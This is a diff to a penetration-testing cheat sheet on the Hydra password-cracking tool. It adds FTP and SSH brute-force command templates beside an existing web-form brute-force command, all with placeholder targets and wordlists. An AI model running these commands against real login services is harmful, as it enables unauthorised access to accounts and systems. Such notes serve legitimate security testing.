@@ -4,6 +4,13 @@ Source: https://github.com/vanhauser-thc/thc-hydra
 POST Web Form Brute Force:
   hydra -l <USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "<PATH>:username=^USER^&password=^PASS^:F=<INVALID_RESPONSE>" -vV
 
+FTP Brute Force Passwords:
+- =hydra -l <USERNAME> -P <PASSLIST> ftp://<TARGET_IP>=
+
+SSH Brute Force Passwords:
+- =hydra -l <USERNAME> -P <PASSLIST> ssh://<TARGET_IP>=
+
+
 Options:
   -l                       Specify a single username 
   -L                       Use username wordlist
